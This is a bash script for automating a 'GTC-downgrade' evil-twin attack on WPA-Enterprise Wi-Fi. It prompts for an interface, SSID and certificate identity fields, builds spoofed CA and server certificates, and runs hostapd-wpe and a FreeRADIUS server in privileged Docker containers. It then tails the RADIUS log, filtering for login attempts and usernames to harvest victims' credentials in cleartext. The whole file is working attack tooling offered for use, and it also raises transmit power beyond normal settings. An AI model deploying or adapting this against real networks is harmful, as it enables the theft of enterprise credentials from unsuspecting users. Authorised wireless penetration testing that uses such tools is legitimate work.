#!/bin/bash

# GTC-downgrade automation script v.1
# Author: Viet Luu (Mr.V)
# www: Ring0labs.com
# Running gtc-downgrade within docker's container

# echo "[!] Running gtc-downgrade automation v.1 script."

usage()
{
cat << EOF
usage: $0 options

GTC-downgrade automation script v.1 - Viet Luu

Usage: gtc-downgrade.sh <option(s)

OPTIONS:
   -h      Show this message
   -q      Quick run (Only run after full setup)
   -f      Full setup (Will prompt to setup certs, and full AP configurations)
EOF
}

QUICK=
FULL=
INTERFACE=
DRIVER=
SSID=
CHANNEL=
C_NAME=
StateOrProvinceName=
LocalityName=
OrganizationName=
EmailAddress=
CommonName=
CURRENT_PATH="`pwd`"


runCheck()
{
    if [[ $DRIVER == 'Y' ]] || [[ $DRIVER == 'y' ]]
    then
	iwconfig $INTERFACE txpower 30
    fi
    echo "[!] GTC-downgrade automation script v.1 - Viet Luu"
    xterm -fa monaco -fs 11 -hold -e "docker run --rm -t -i --privileged --net=host -v $(pwd):/conf hostapd-wpe-domain hostapd-wpe /conf/hostapd.conf && nmcli n off && rfkill unblock all && ifconfig $INTERFACE up" &
    # gnome-terminal -x sh -c "docker run --rm -t -i --privileged --net=host -v $(pwd):/conf hostapd-wpe-domain hostapd-wpe /conf/hostapd.conf && nmcli n off && rfkill unblock all && ifconfig $INTERFACE up bash" 
    xterm -fa monaco -fs 11 -hold -e "tail -f $CURRENT_PATH/logs/radius.log | grep -i --color=always -i -E 'login\sattempt\swith|User-Name\s'" &
    # gnome-terminal -x sh -c "tail -f $CURRENT_PATH/logs/radius.log | grep -i --color=always -i -E 'login\sattempt\swith|User-Name\s'; bash "
    docker run --rm -t -i --name radiusd -v $(pwd)/logs:/logs -v $(pwd):/conf hostapd-gtc-downgrade radiusd -X -l /logs/radius.log -d conf/raddb   
}

while getopts “hqf” OPTION
do
    case $OPTION in
        h)
             usage
             exit 1
             ;;
        q)
             QUICK=true
             FULL=false
             ;;
        f)
             FULL=true
             QUICK=false
             ;;
        ?)
             usage
             exit
             ;;
     esac
done

if [[ -z $QUICK ]] || [[ -z $FULL ]]
then
    usage
    exit 1
else
    if [[ $FULL == true ]]
    then
        echo -n '[?] Interface [ENTER]: '
        read INTERFACE
	echo -n '[?] rtl88xxau Driver (Y/N)'
	read DRIVER
        echo -n '[?] SSID [ENTER]: '
        read SSID
        echo -n '[?] CHANNEL [ENTER]: '
        read CHANNEL
        echo -n '[?] COUNTRY NAME [ENTER]: '
        read C_NAME
        echo -n '[?] StateOrProvinceName [ENTER]: '
        read StateOrProvinceName
        echo -n '[?] LocalityName [ENTER]: '
        read LocalityName
        echo -n '[?] OrganizationName [ENTER]: '
        read OrganizationName
        echo -n '[?] EmailAddress [ENTER]: '
        read EmailAddress
        echo -n '[?] CommonName [ENTER]: '
        read CommonName

        # Build hostapd-wpe.conf file

        sed -i "1s/interface.*/interface=$INTERFACE/" $CURRENT_PATH/hostapd.conf 
        sed -i "3s/ssid.*/ssid=$SSID/" $CURRENT_PATH/hostapd.conf 
        sed -i "2s/channel.*/channel=$CHANNEL/" $CURRENT_PATH/hostapd.conf 

        # Remove cert folder, if exists.

        if [ -d "$CURRENT_PATH/certs" ]; then
            rm -rf "$CURRENT_PATH/certs"
            cp -r "$CURRENT_PATH/backup/certs" .
	else
	    cp -r "$CURRENT_PATH/backup/certs" .
        fi

        # Build certs

        sed -i "49s/countryName.*/countryName = $C_NAME/" $CURRENT_PATH/certs/ca.cnf 
        sed -i "50s/stateOrProvinceName.*/stateOrProvinceName = $StateOrProvinceName/" $CURRENT_PATH/certs/ca.cnf 
        sed -i "51s/localityName.*/localityName = $LocalityName/" $CURRENT_PATH/certs/ca.cnf 
        sed -i "52s/organizationName.*/organizationName = $OrganizationName/" $CURRENT_PATH/certs/ca.cnf 
        sed -i "53s/emailAddress.*/emailAddress = $EmailAddress/" $CURRENT_PATH/certs/ca.cnf 
        sed -i "54s/commonName.*/commonName = $CommonName/" $CURRENT_PATH/certs/ca.cnf 

        sed -i "48s/countryName.*/countryName = $C_NAME/" $CURRENT_PATH/certs/server.cnf 
        sed -i "49s/stateOrProvinceName.*/stateOrProvinceName = $StateOrProvinceName/" $CURRENT_PATH/certs/server.cnf 
        sed -i "50s/localityName.*/localityName = $LocalityName/" $CURRENT_PATH/certs/server.cnf 
        sed -i "51s/organizationName.*/organizationName = $OrganizationName/" $CURRENT_PATH/certs/server.cnf 
        sed -i "52s/emailAddress.*/emailAddress = $EmailAddress/" $CURRENT_PATH/certs/server.cnf 
        sed -i "53s/commonName.*/commonName = $CommonName/" $CURRENT_PATH/certs/server.cnf 

        # Run bootstrap

        sh $CURRENT_PATH/certs/bootstrap 
	rm -rf "$CURRENT_PATH/raddb/certs"
	cp -r "$CURRENT_PATH/certs" "$CURRENT_PATH/raddb/certs"

	# Add logs folder

	mkdir -p $CURRENT_PATH/logs

        runCheck

    else
        runCheck
    fi
fi
    
